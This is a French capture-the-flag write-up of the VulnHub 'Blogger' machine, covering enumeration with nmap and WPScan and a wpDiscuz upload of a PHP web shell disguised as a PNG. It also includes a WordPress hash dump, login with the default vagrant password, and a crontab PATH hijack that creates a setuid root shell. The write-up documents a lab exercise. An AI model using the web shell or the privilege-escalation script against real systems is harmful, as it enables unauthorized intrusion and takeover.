# Solution du CTF Blogger de VulnHub

On attaque ce CTF [blogger qui nous vient de VulnHub](https://www.vulnhub.com/entry/blogger-1,675/). Il y a quelques manipulations pour pouvoir bien importer l'image virtuelle dans VirtualBox. D'abord désactiver les ports série ainsi que les dossiers partagés qui pointaient vers des paths sur le système de l'auteur.

## Enumération

Sans ça l'importation ne fonctionne pas ou au mieux vous aurez des messages de warning.

```shellsession
$ sudo nmap -T5 -p- -sCV 192.168.56.41
[sudo] Mot de passe de root : 
Starting Nmap 7.93 ( https://nmap.org )
Nmap scan report for 192.168.56.41
Host is up (0.00012s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 951d828f5ede9a00a80739bdacadd344 (RSA)
|   256 d7b452a2c8fab70ed1a8d070cd6b3690 (ECDSA)
|_  256 dff24f773344d593d77917455aa1368b (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Blogger | Home
|_http-server-header: Apache/2.4.18 (Ubuntu)
MAC Address: 02:1C:00:A5:06:70 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Le site sur le port 80 est une espèce de coquille vide avec la plupart des liens ne menant nul part. On peut lancer Wapiti avec une liste de modules vide et en mode verbeux pour voir la liste des resources trouvées par le crawler :

```shellsession
$ wapiti -u http://192.168.56.41/ --color  -m "" --flush-session -v2
ujson module not found, using json

     __      __               .__  __  .__________
    /  \    /  \_____  ______ |__|/  |_|__\_____  \
    \   \/\/   /\__  \ \____ \|  \   __\  | _(__  <
     \        /  / __ \|  |_> >  ||  | |  |/       \
      \__/\  /  (____  /   __/|__||__| |__/______  /
           \/        \/|__|                      \/
Wapiti 3.1.4 (wapiti-scanner.github.io)
[+] GET http://192.168.56.41/ (0)
[+] POST http://192.168.56.41/ (1)
        data: Name=default&Email=wapiti2021%40mailinator.com&Subject=default
[+] GET http://192.168.56.41/js/easing.js (1)
[+] GET http://192.168.56.41/js/simpleLightbox.js (1)
[+] GET http://192.168.56.41/index.html (1)
[+] GET http://192.168.56.41/js/bootstrap.js (1)
[+] GET http://192.168.56.41/js/jquery.countup.js (1)
[+] GET http://192.168.56.41/js/jquery-2.2.3.min.js (1)
[+] GET http://192.168.56.41/js/move-top.js (1)
[+] GET http://192.168.56.41/js/aos.js (1)
[+] GET http://192.168.56.41/js/jquery.waypoints.min.js (1)
[+] GET http://192.168.56.41/js/jquery.roadmap.js (1)
[+] POST http://192.168.56.41/index.html (2)
        data: Name=default&Email=wapiti2021%40mailinator.com&Subject=default
```

Le seul formulaire effectif trouvé correspond à la possibilité de poster un commentaire mais Wapiti n'a trouvé aucune vulnérabilité. Je n'ai pas eu plus de résultats en testant un XSS en aveugle.

J'ai lancé un feroxbuster avec la commande suivante :

```bash
feroxbuster -u http://blogger.thm/ -w fuzzdb/discovery/predictable-filepaths/filename-dirname-bruteforce/raft-large-directories.txt
```

mais voyant que ça commençait à scanner dans des dossiers inutiles (assets, css, images, js, etc) j'ai stoppé l'énumération.

![C'est con ça](https://raw.githubusercontent.com/devl00p/blog/master/images/cest_con_ca.gif)

Bien mal m'en a pris car l'auteur du CTF a placé un Wordpress à l'adresse http://blogger.thm/assets/fonts/blog

La description du CTF stipule qu'on doit considérer l'hôte comme ayant un DNS spécifique alors je le passe à la commande Docker pour lancer WPScan :

```bash
$ docker run --add-host blogger.thm:192.168.56.41 -it --rm wpscanteam/wpscan --url http://blogger.thm/assets/fonts/blog/ -e ap,at,cb,dbe --plugins-detection aggressive
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://blogger.thm/assets/fonts/blog/ [192.168.56.41]

--- snip ---

[+] WordPress version 4.9.8 identified (Insecure, released on 2018-08-02).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blogger.thm/assets/fonts/blog/?feed=rss2, <generator>https://wordpress.org/?v=4.9.8</generator>
 |  - http://blogger.thm/assets/fonts/blog/?feed=comments-rss2, <generator>https://wordpress.org/?v=4.9.8</generator>

--- snip ---

[+] akismet
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/
 | Last Updated: 2022-09-28T15:27:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | [!] The version is out of date, the latest version is 5.0.1
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/, status: 200
 |
 | Version: 4.0.8 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/akismet/readme.txt

[+] wpdiscuz
 | Location: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/
 | Last Updated: 2022-10-12T19:07:00.000Z
 | Readme: http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
 | [!] The version is out of date, the latest version is 7.5
 |
 | Found By: Known Locations (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/, status: 200
 |
 | Version: 7.0.4 (80% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://blogger.thm/assets/fonts/blog/wp-content/plugins/wpdiscuz/readme.txt
```

## Exploitation web

Ici on voit la présence du plugin wpDiscuz déjà croisé sur le [CTF Moee de VulnHub](https://devloop.users.sourceforge.net/index.php?article259/solution-du-ctf-moee-de-vulnhub). On va donc tenter à une exploitation similaire en uploadant un script PHP qui fera croire qu'il est une image via l'ajout d'entêtes spécifiques.

```bash
$ echo -e '\x89\x50\x4e\x47\x0d\x0a\x1a\x0a\x00\x00\x00\x0d\x49\x48\x44\x52\x00<?php system($_GET["cmd"]); ?>' > shell.php
```

Comme pour le précédent CTF il suffit d'aller en bas d'un article dans la zone de commentaire, cliquer sur la petite image au bas à droite et procéder à l'upload.

L'image uploadée est intégrée dynamiquement dans la page, on note son URL et on ajoute notre paramètre `cmd` pour avoir l'exécution de commande :)

## Escalade de privilèges

Après upload et exécution d'un reverse-ssh, mon premier réflexe est d'aller voir le fichier de configuration de Wordpress :

```php
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'sup3r_s3cr3t');
```

On peut alors se connecter au serveur MySQL local et dumper la table des utilisateurs :

```sql
MariaDB [wordpress]> select * from wp_users;
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
| ID | user_login | user_pass                          | user_nicename | user_email        | user_url | user_registered     | user_activation_key | user_status | display_name |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
|  1 | j@m3s      | $P$BqG2S/yf1TNEu03lHunJLawBEzKQZv/ | jm3s          | admin@blogger.thm |          | 2021-01-17 12:40:06 |                     |           0 | j@m3s        |
+----+------------+------------------------------------+---------------+-------------------+----------+---------------------+---------------------+-------------+--------------+
```

Je vois dans /home/james que l'utilisateur dispose d'un flag mais ce dernier n'est pas lisible par tous. Il faut certainement casser le hash wordpress. Je me lance donc sur cette tache :

```shellsession
$ ./john --format=phpass --wordlist=rockyou.txt hashes.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 128/128 AVX 4x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
```

Mais après un moment force est de constater que ça ne mène à rien. C'est bien dommage car une entrée de la contab implique cet utilisateur :

```bash
SHELL=/bin/sh
PATH=/home/james:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* * * * * root /usr/local/bin/backup.sh
```

Quand on regarde la liste des utilisateurs sur le système on voit que le compte vagrant a un UID de 1000 ce qui est étonnant pour un compte normalement créé lors de l'installation d'un logiciel.

```
vagrant:x:1000:1000:,,,:/home/vagrant:/bin/bash
ubuntu:x:1001:1001:Ubuntu:/home/ubuntu:/bin/bash
mysql:x:112:117:MySQL Server,,,:/nonexistent:/bin/false
james:x:1002:1002:James M Brunner,,,:/home/james:/bin/bash
```

Il apparait qu'on peut se connecter avec *vagrant* en utilisant le mot de passe *vagrant*.

L'utilisateur a ensuite les droits pour passer root :

```shellsession
www-data@ubuntu-xenial:/$ su vagrant
Password: 
vagrant@ubuntu-xenial:/$ id
uid=1000(vagrant) gid=1000(vagrant) groups=1000(vagrant)
vagrant@ubuntu-xenial:/$ sudo -l
Matching Defaults entries for vagrant on ubuntu-xenial:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User vagrant may run the following commands on ubuntu-xenial:
    (ALL) NOPASSWD: ALL
vagrant@ubuntu-xenial:/$ sudo su
root@ubuntu-xenial:/# cd /root
root@ubuntu-xenial:~# ls
root.txt
root@ubuntu-xenial:~# cat root.txt | base64 -d
Hey There,
Myself Gaurav Raj, Hacker, Programmer & FreeLancer.
This is my first attempt to create a room. Let me know if you liked it.
Any issue or suggestions for me. Ping me at twitter

Twitter: @thehackersbrain
Github: @thehackersbrain
Instagram: @thehackersbrain
Blog: https://thehackersbrain.pythonanywhere.com


Here's Your Flag.
flag{W311_D0n3_Y0u_P3n3tr4t3d_M3 :)}
```

## Autre méthode

Pour faire le chemin depuis james on peut exploiter le fait que le dossier personnel de l'utilisateur est en premier de l'ordre de path spécifié dans la crontab :

```shellsession
james@ubuntu-xenial:~$ cat privesc.sh 
#!/bin/sh
cp /bin/sh /tmp/rootshell
chmod 4755 /tmp/rootshell
james@ubuntu-xenial:~$ cp privesc.sh tar
```

On attend un peu et BOUM on a notre shell avec euid root :

```shellsession
james@ubuntu-xenial:~$ /tmp/rootshell -p
# id
uid=1002(james) gid=1002(james) euid=0(root) groups=1002(james)
```

Cela ne fonctionne pas en usurpant la commande cd, certainement car c'est une commande builtin à bash.

On aurait aussi pu se servir des wildcards comme sur le [CTF /dev/random: Pipe](https://devloop.users.sourceforge.net/index.php?article137/solution-du-ctf-dev-random-pipe-de-vulnhub).

## Conclusion

Encore un de ces CTFs où l'auteur semble avoir tenté de placer certaines idées, n'a pas réussi à les exploiter lui même et est passé à une solution alternative.

Au final un CTF qui manque de logique.
